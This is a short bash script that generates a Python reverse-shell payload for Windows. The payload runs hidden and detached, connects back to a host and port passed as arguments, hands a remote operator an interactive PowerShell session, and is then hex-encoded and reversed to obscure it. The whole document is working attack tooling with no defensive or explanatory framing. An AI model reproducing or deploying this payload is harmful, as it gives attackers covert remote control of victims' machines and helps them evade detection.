#!/bin/bash
cd -- "$( dirname -- "${BASH_SOURCE[0]}" )"

cat <<EOF|tee bin/pyrs
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa="""
import time,socket,os,threading,subprocess as sp; flags = 0x08000000  # CREATE_NO_WINDOW
p=sp.Popen(['$3'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT, close_fds=False, creationflags=flags, universal_newlines=True, shell=False);s=socket.socket()
for retry in range(12):
  try: s.connect(('$1',$2));break
  except: time.sleep(5)

NL=os.linesep.encode();os.write(p.stdin.fileno(),b"\$OutputEncoding = [console]::InputEncoding = [console]::OutputEncoding = New-Object System.Text.UTF8Encoding ;cd /users;powershell;exit; "+NL)
time.sleep(1);os.read(p.stdout.fileno(),1024);os.write(p.stdin.fileno(),NL+b"ls"+NL)
threading.Thread(target=exec,args=('while(True):o=os.read(p.stdout.fileno(),1024);s.send(o);time.sleep(0.01)',globals()),daemon=True).start();
threading.Thread(target=exec,args=('while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i);time.sleep(0.01)',globals()),daemon=True).start();
p.wait();s.send(b"[*] Quitting ..."+NL);s.shutdown();
"""
import subprocess as sp,sys
flags = 0
flags |= 0x00000008  # DETACHED_PROCESS
flags |= 0x00000200  # CREATE_NEW_PROCESS_GROUP
p = sp.Popen([sys.executable, '-c', aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa], close_fds=True, creationflags=flags)
EOF

# Encode python payload
ENCODED=$(cat bin/pyrs|perl -e 'local $/; print unpack "H*", <>'| tr -d '\n' | rev)
echo -n $ENCODED > bin/pyrs